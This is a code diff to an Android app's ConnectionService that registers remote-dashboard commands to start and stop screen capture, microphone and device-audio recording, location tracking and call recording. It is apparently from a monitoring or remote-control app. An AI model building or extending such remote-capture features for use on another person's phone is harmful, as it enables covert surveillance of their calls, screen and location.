@@ -74,11 +74,43 @@ class ConnectionService : Service() {
         super.onCreate()
         createNotificationChannel()
         connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        // Call-recording command handlers live here (long-lived) so they work
-        // even when the recording services are not running:
-        //  - call_video_start needs the one-time screen-capture consent first;
-        //    if no session is alive the dashboard is told consent is required.
-        //  - call_audio_start needs no consent and cold-starts the mic service.
+        // ALL remote command handlers live here. This service is the single
+        // long-lived process anchor, so every command works even when the
+        // capture services are not running (the old design registered handlers
+        // per-service in onCreate, so a stopped service left commands with no
+        // handler and the dashboard got an ack but nothing happened).
+        //
+        // Each handler cold-starts its service via startForegroundService
+        // (allowed because this service is already foreground) or reports a
+        // consent_needed event when the feature needs the one-time
+        // screen-capture dialog.
+        CommandBus.register(CommandBus.CMD_CAPTURE) {
+            ScreenCaptureService.onRemoteCapture(applicationContext)
+        }
+        CommandBus.register(CommandBus.CMD_AUDIO_START) {
+            AudioRecorderService.onRemoteStart(applicationContext)
+        }
+        CommandBus.register(CommandBus.CMD_AUDIO_STOP) {
+            AudioRecorderService.onRemoteStop(applicationContext)
+        }
+        CommandBus.register(CommandBus.CMD_LOC_START) {
+            LocationService.onRemoteStart(applicationContext)
+        }
+        CommandBus.register(CommandBus.CMD_LOC_STOP) {
+            LocationService.onRemoteStop(applicationContext)
+        }
+        CommandBus.register(CommandBus.CMD_REC_START) {
+            ScreenAudioRecorderService.onRemoteRecordStart(applicationContext)
+        }
+        CommandBus.register(CommandBus.CMD_REC_STOP) {
+            ScreenAudioRecorderService.onRemoteRecordStop(applicationContext)
+        }
+        CommandBus.register(CommandBus.CMD_DEV_AUDIO_START) {
+            DeviceAudioService.onRemoteStart(applicationContext)
+        }
+        CommandBus.register(CommandBus.CMD_DEV_AUDIO_STOP) {
+            DeviceAudioService.onRemoteStop(applicationContext)
+        }
         CommandBus.register(CommandBus.CMD_CALL_VIDEO_START) {
             ScreenAudioRecorderService.onRemoteCallVideoStart(applicationContext)
         }
@@ -131,6 +163,15 @@ class ConnectionService : Service() {
     override fun onDestroy() {
         mainHandler.removeCallbacks(notifUpdater)
         unregisterNetworkCallback()
+        CommandBus.unregister(CommandBus.CMD_CAPTURE)
+        CommandBus.unregister(CommandBus.CMD_AUDIO_START)
+        CommandBus.unregister(CommandBus.CMD_AUDIO_STOP)
+        CommandBus.unregister(CommandBus.CMD_LOC_START)
+        CommandBus.unregister(CommandBus.CMD_LOC_STOP)
+        CommandBus.unregister(CommandBus.CMD_REC_START)
+        CommandBus.unregister(CommandBus.CMD_REC_STOP)
+        CommandBus.unregister(CommandBus.CMD_DEV_AUDIO_START)
+        CommandBus.unregister(CommandBus.CMD_DEV_AUDIO_STOP)
         CommandBus.unregister(CommandBus.CMD_CALL_VIDEO_START)
         CommandBus.unregister(CommandBus.CMD_CALL_VIDEO_STOP)
         CommandBus.unregister(CommandBus.CMD_CALL_AUDIO_START)
